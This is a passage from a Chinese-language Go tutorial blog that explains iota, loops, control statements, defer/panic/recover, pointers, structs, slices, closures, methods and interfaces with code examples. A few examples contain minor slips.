0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>    a = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 0</span><br>    b = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 1</span><br>    c = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 2</span><br>    d = <span class="hljs-string">&quot;12&quot;</span> <span class="hljs-comment">// 独立值,iota +=1</span><br>    e = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><p>Go语言中只有一种循环结构：<code>for</code>循环。对你没看错，只有这一种，<code>while</code>循环都是通过<code>for</code>变形而来。</p><p>基本的 <code>for</code> 循环由三部分组成，它们用分号隔开：</p><ul><li>初始化语句：在第一次迭代前执行</li><li>条件表达式：在每次迭代前求值</li><li>后置语句：在每次迭代的结尾执行</li></ul><p><strong>注意：</strong>和 C、Java、JavaScript 之类的语言不同，Go 的 for 语句后面的三个构成部分外没有小括号， 大括号 <code>&#123; &#125;</code> 则是必须的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>sum += i<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Go中的while循环</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> sum &lt; <span class="hljs-number">1000</span> &#123;<br>sum += sum<br>&#125;<br><span class="hljs-comment">// while(true) 无限循环</span><br><span class="hljs-keyword">for</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="条件控制语句"><a href="#条件控制语句" class="headerlink" title="条件控制语句"></a>条件控制语句</h3><p>Go 的 <code>if</code> 语句与 <code>for</code> 循环类似，表达式外无需小括号 <code>( )</code> ，<strong>而大括号 <code>&#123; &#125;</code> 则是必须的.</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> sqrt(-x) + <span class="hljs-string">&quot;i&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>if</code>语句同样可以在条件表达式前执行一个简单的语句，比如声明变量，该变量的作用域仅在<code>if</code>和<code>else</code>之内。</p><p><strong>switch控制语句</strong></p><p>Go语言中的switch语句，运行时会从上向下顺次执行，直到匹配成功时停止。，Go语言对每个case默认提供了<code>break</code>语句，使用 <code>fallthrough </code>会强制执行后面的 case 语句，<code>fallthrough </code>不会判断下一条 case 的表达式结果是否为 true。</p><p><strong>select语句</strong></p><p>select 是 Go 中的一个控制结构，类似于 switch 语句。</p><p>select 语句只能用于通道操作，每个 case 必须是一个通道操作，要么是发送要么是接收。</p><p>select 语句会监听所有指定的通道上的操作，一旦其中一个通道准备好就会执行相应的代码块。</p><p>如果多个通道都准备好，那么 select 语句会随机选择一个通道执行。如果所有通道都没有准备好，那么执行 default 块中的代码。</p><p>select语句的语法：</p><ul><li>每个 case 都必须是一个通道</li><li>所有 channel 表达式都会被求值</li><li>所有被发送的表达式都会被求值</li><li>如果任意某个通道可以进行，它就执行，其他被忽略。</li><li>如果有多个 case 都可以运行，select 会随机公平地选出一个执行，其他不会执行。<br>否则：<ul><li>如果有 default 子句，则执行该语句。</li><li>如果没有 default 子句，select 将阻塞，直到某个通道可以运行；Go 不会重新对 channel 或值进行求值。</li></ul></li></ul><p><strong>defer</strong></p><p>defer 语句会将函数推迟到外层函数返回之后执行。</p><p>推迟调用的函数其参数会立即求值，但直到外层函数返回前该函数都不会被调用。<strong>在关闭文件或者网络接口是极其有用。</strong></p><p><code>defer</code>有一下规则需要注意：</p><ul><li>推迟的函数调用会被压入一个栈中。当外层函数返回时，被推迟的函数会按照后进先出的顺序调用。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">b</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>        <span class="hljs-keyword">defer</span> fmt.Print(i)<br>    &#125;<br>&#125;<br><span class="hljs-comment">// output: 3210</span><br></code></pre></td></tr></table></figure><ul><li>如果<code>defer</code>执行的函数存在参数，那么该参数就是执行<code>defer</code>时值，并不会因为后续的操作而变化。例如:</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span> &#123;<br>    i := <span class="hljs-number">0</span><br>    <span class="hljs-keyword">defer</span> fmt.Println(i)<br>    i++<br>    <span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// output: 0</span><br></code></pre></td></tr></table></figure><ul><li><code>defer</code>可以修改调用函数的命名返回值。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">c</span><span class="hljs-params">()</span></span> (i <span class="hljs-type">int</span>) &#123;<br>    i = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; i++ &#125;()<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-comment">// c() return 2</span><br></code></pre></td></tr></table></figure><ul><li><p><code>return</code>首先会对返回值进行值拷贝，将<code>return</code>语句返回的值复制到函数返回值栈区（如果只有<code>return</code>，不带任何变 或值，则此步骤不做任何动作）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">d</span><span class="hljs-params">()</span></span> (i <span class="hljs-type">int</span>) &#123;<br>    t := <span class="hljs-number">3</span><br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; t++ &#125;()<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-comment">// c() return 3</span><br></code></pre></td></tr></table></figure></li></ul><p>实际上，<code>defer</code>语句是本函数<code>return</code>语句进行调用的，举个例子：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">func f() (result int)<br>defer <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">()</span></span>&#123;<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>实际上执行流程为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">返回值（有名返回值存储在栈上，实际上修改栈上返回值数据） = xxx<br>调用<span class="hljs-keyword">defer</span>函数（如果<span class="hljs-keyword">defer</span>能够获栈上的返回值，则可以修改）<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>​<strong>defer函数的参数值，是在申明defer时确定下来的。</strong>在defer函数申明时，对外部变量的引用是有两种方式：作为函数参数和作为闭包引用</p><ul><li>作为函数参数，在defer申明时就把值传递给defer，并将值缓存起来，调用defer的时候使用缓存的值进行计算</li><li>而作为闭包引用，在defer函数执行时根据整个上下文确定当前的值</li></ul><p>举个比较特殊的例子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    i := <span class="hljs-number">0</span><br>    <span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;a:&quot;</span>, i)<br>    <span class="hljs-comment">//闭包调用，将外部i传到闭包中进行计算，不会改变i的值，如上边的例3</span><br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;b:&quot;</span>, i)<br>    &#125;(i)<br>    <span class="hljs-comment">//闭包调用，捕获同作用域下的i进行计算</span><br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;c:&quot;</span>, i)<br>    &#125;()<br>    i++<br>&#125;<br><span class="hljs-comment">// output</span><br><span class="hljs-comment">// c: 1</span><br><span class="hljs-comment">// b: 0</span><br><span class="hljs-comment">// a: 0</span><br></code></pre></td></tr></table></figure><p><strong>panic</strong></p><p>​内置函数，能够直接终止程序控制流，同时调用本函数<code>defer</code>，并将<code>panic</code>向上层传递，直到整个程序返回异常。</p><p><strong>Recover</strong></p><p>​终止<code>panic</code>的函数，一般写在<code>defer</code>中，能够终止<code>panic</code>的终止信号，并停止向上层传递，此时程序将正常返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">F</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>        <span class="hljs-keyword">if</span> err := <span class="hljs-built_in">recover</span>(); err != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;捕获异常:&quot;</span>, err)<br>        &#125;<br>        fmt.Println(<span class="hljs-string">&quot;b&quot;</span>)<br>    &#125;()<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>  recover都是在<code>当前的goroutine</code>里进行捕获的，这就是说，对于创建goroutine的外层函数，如果goroutine内部发生panic并且内部没有用recover，外层函数是无法用recover来捕获的</p></blockquote><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><strong>指针</strong></p><p>Go语言中存在指针，保存值的内存地址，指针的操作与C语言中的类似，<strong>但是，Go中默认没有指针运算，即不支持<code>++/--</code>操作。</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">p</span> *int<br><span class="hljs-selector-tag">p</span> = &amp;<span class="hljs-selector-tag">i</span><br>*<span class="hljs-selector-tag">p</span> = <span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>当然，如果你真的想用指针运算的话，可以使用<code>uintptr </code>实现，<code>uintptr</code>支持指针运算，只不过普通指针需要需要先转换为<code>unsafe.Pointer</code>，然后在转换为<code>uintptr </code>（没有<code>uintptr </code>与普通指针的转换方式）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">a:=[<span class="hljs-number">3</span>]<span class="hljs-type">int8</span>&#123;<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;<br>a_first_point:=&amp;a[<span class="hljs-number">0</span>]<br>a_first_unsafe_point:=unsafe.Pointer(a_first_point)<br>a_uintptr_first_unsafe_point:=<span class="hljs-type">uintptr</span>(a_first_unsafe_point)<br>a_uintptr_first_unsafe_point++<br></code></pre></td></tr></table></figure><p><strong>结构体</strong></p><p>Go语言结构体声明和使用与C语言类似，使用<code>struc_name.filed_name</code>访问。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> Vertex <span class="hljs-keyword">struct</span> &#123;<br>X <span class="hljs-type">int</span><br>Y <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>v := Vertex&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br>v.X = <span class="hljs-number">4</span><br>p := &amp;v<br>fmt.Println(v.X)<br>fmt.Println((*p).X)<br>fmt.Println(p.X)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>  值得注意的是，如果使用结构体指针，Go语言中允许我们使用隐式间接引用<code>struc_ptr.filed_name</code>，而并非C语言的<code>struc_ptr-&gt;filed_name</code>形式。</p></blockquote><p>Go语言结构题可以通过直接列出字段的值来新分配一个结果。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Vertex <span class="hljs-keyword">struct</span> &#123;<br>X, Y <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-keyword">var</span> (<br>v1 = Vertex&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;  <span class="hljs-comment">// 创建一个 Vertex 类型的结构体</span><br>v2 = Vertex&#123;X: <span class="hljs-number">1</span>&#125;  <span class="hljs-comment">// Y:0 被隐式地赋予</span><br>v3 = Vertex&#123;&#125;      <span class="hljs-comment">// X:0 Y:0</span><br>p  = &amp;Vertex&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125; <span class="hljs-comment">// 创建一个 *Vertex 类型的结构体（指针）</span><br>)<br></code></pre></td></tr></table></figure><p><strong>切片与数组</strong></p><p>每个数组的大小都是固定的，而切片可以动态提取数组中的一部分，切片通过两个下标来界定，即一个上界和一个下界，二者以冒号分隔：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[low : high]</span><br></code></pre></td></tr></table></figure><p>它会选择一个半开区间，包括第一个元素，但排除最后一个元素。切片拥有<strong>长度</strong>和<strong>容量</strong>，切片的长度它所包含的元素个数，使用<code>len(s)</code>获取；切片的容量是从它的第一个元素（注意是切片选取的，并不是数组的）开始数，到其底层数组元素末尾的个数，使用cap(s)获取。</p><p>以下表达式创建了一个切片，它包含 <code>a</code> 中下标从 1 到 3 的元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[:5]</span><br></code></pre></td></tr></table></figure><p>切片的结构如下图所示，</p><p><img src="https://img-blog.csdnimg.cn/direct/fb5dd9d1e223415c95e4fca9316f9eca.png" alt="image-20230415134148507"></p><blockquote><p>  切片操作并不复制切片指向的元素。它创建一个新的切片并复用原来切片的底层数组。 这使得切片操作和数组索引一样高效。因此，通过一个新切片修改元素会影响到原始切片的对应元素。但是，如果一个引用数组的切片进行了copy或者append等操作时，这个切片就与原先的数组脱离的联系，仅仅内容一致而已。</p></blockquote><p>创建数组时我们需要指定数组的长度，而切片可以从已创建数组中截取，也可以新建一个数组然后引用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 创建数组</span><br>q := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>&#125;<br><span class="hljs-comment">// 创建切片数组，此处会创建一个和上面相同的数组，然后构建一个引用了他的切片</span><br>q := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>&#125;<br><span class="hljs-comment">// 使用动态方法创建切片</span><br>q := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) <span class="hljs-comment">// len(q) = 0 , cap(q) = 5</span><br></code></pre></td></tr></table></figure><h3 id="函数闭包"><a href="#函数闭包" class="headerlink" title="函数闭包"></a>函数闭包</h3><p>Go 函数可以是一个闭包。闭包是一个函数值，<strong>它引用了其函数体之外的变量</strong>。该函数可以访问并赋予其引用的变量的值，换句话说，该函数被这些变量“绑定”在一起。Go通常使用这种方式来保存函数内部的局部变量，这与C语言中的静态局部变量功能类似，但有所区别：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">adder</span><span class="hljs-params">()</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>sum := <span class="hljs-number">0</span><br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>sum += x<br><span class="hljs-keyword">return</span> sum<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>pos, neg := adder(), adder()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>fmt.Println(<br>pos(i),<br>neg(<span class="hljs-number">-2</span>*i),<br>)<br>&#125;<br>&#125;<br><span class="hljs-comment">// output</span><br><span class="hljs-comment">// 0 0</span><br><span class="hljs-comment">// 1 -2</span><br><span class="hljs-comment">// 3 -6</span><br><span class="hljs-comment">// 6 -12</span><br><span class="hljs-comment">// 10 -20</span><br><span class="hljs-comment">// 15 -30</span><br><span class="hljs-comment">// 21 -42</span><br><span class="hljs-comment">// 28 -56</span><br><span class="hljs-comment">// 36 -72</span><br><span class="hljs-comment">// 45 -90</span><br></code></pre></td></tr></table></figure><p>在上述程序中<code>pos</code>和<code>neg</code>所形成的闭包是不同的，因此其内部的局部变量也是不同的，C语言中无论如何调用函数，静态局部变量始终是同一个。</p><p><code>斐波那契闭包</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// 返回一个“返回int的函数”</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fibonacci</span><span class="hljs-params">()</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">int</span> &#123;<br>i := <span class="hljs-number">0</span><br>j := <span class="hljs-number">1</span><br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">int</span>&#123;<br>r := i<br>i = j<br>j = r + j<br><span class="hljs-keyword">return</span> r<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>f := fibonacci()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++ &#123;<br>fmt.Println(f())<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>​Go中不存在类的概念，但是可以为结构体定义<strong>方法</strong>。方法就是一类带特殊接收者参数的函数（可以理解为数据类型的类函数）。方法接收者在它自己的参数列表内，位于 <code>func</code> 关键字和方法名之间。<code>Abs</code> 方法拥有一个名为 <code>v</code>，类型为 <code>Vertex</code> 的接收者。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Vertex <span class="hljs-keyword">struct</span> &#123;<br>X, Y <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v Vertex)</span></span> Abs() <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> math.Sqrt(v.X*v.X + v.Y*v.Y)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>v := Vertex&#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>fmt.Println(v.Abs())<br>    <span class="hljs-comment">// 或 </span><br>    fmt.Println(Abs(v))<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>  注意，方法的声明只能为同一包内定义的类型的接收者声明方法，而不能为其它包内定义的类型（包括 <code>int</code> 之类的内建类型）的接收者声明方法。</p><p>  如果需要声明其他包类型，可以在本包内使用<code>type</code>重新声明一个类型别名</p></blockquote><p>​当然由于Go语言函数值是值传递，因此，如果我们需要在方法内修改接收者的内容，则传递传递指针，即为<strong>指针接收者</strong>声明方法。<strong>另外，Go语言为了方便起见，变量和指向变量的指针是隐式转换的，我们都可以通过<code>v.fun()</code>直接访问该类型的方法。</strong>当然如果是普通函数传参的话，指针和变量无法隐式转换，是会报编译错误，望周知。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Vertex <span class="hljs-keyword">struct</span> &#123;<br>X, Y <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v Vertex)</span></span> Abs() <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> math.Sqrt(v.X*v.X + v.Y*v.Y)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Vertex)</span></span> Scale(f <span class="hljs-type">float64</span>) &#123;<br>v.X = v.X * f<br>v.Y = v.Y * f<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>v := Vertex&#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>v.Scale(<span class="hljs-number">10</span>)<br>fmt.Println(v.Abs())<br>    <br>   p := &amp;Vertex&#123;<span class="hljs-number">4</span>, <span class="hljs-number">3</span>&#125;<br>p.Scale(<span class="hljs-number">3</span>)<br>fmt.Println(p.Abs())<br>&#125;<br><span class="hljs-comment">// output: 50 15</span><br></code></pre></td></tr></table></figure><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>​接口类型是有一组方法签名定义的集合，接口类型的变量可以保存任何实现了这些方法的值。如果某个类型实现了接口中的所有方法，我们就说该类型实现了该接口。<strong>个人理解就是接口是Go语言中类似于多态的一种机制，接口类型就是虚基类。</strong></p><blockquote><p>  与方法不同的是，如果我们使用接口类型多态执行相关函数，需要严格判断参数的类型，此时指针类型与变量类型无法被认为是同一种。</p></blockquote><p>接口也是值，它们可以像其他值一样传递。接口的内部类型可以简单理解为<code>value</code>和<code>type</code>的结构体（实际上接口类型更加复杂，但是在作用上类似于类型和值），接口的实现就是通过<code>type</code>找到相应数据的底层类型，调用其底层类型的同名方法。</p><h3 id="接口类型断言"><a href="#接口类型断言" class="headerlink" title="接口类型断言"></a>接口类型断言</h3><p>类型断言提供了访问接口值底层具体值的方式。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">t</span> <span class="hljs-symbol">:</span>= i.(<span class="hljs-built_in">T</span>)<br></code></pre></td></tr></table></figure><p>该语句断言（确信）接口值 <code>i</code> 保存了具体类型 <code>T</code>，并将其底层类型为 <code>T</code> 的值赋予变量 <code>t</code>。若 <code>i</code> 并未保存 <code>T</code> 类型的值，该语句就会触发一个<code>panic</code>。</p><p>为了 <strong>判断</strong> 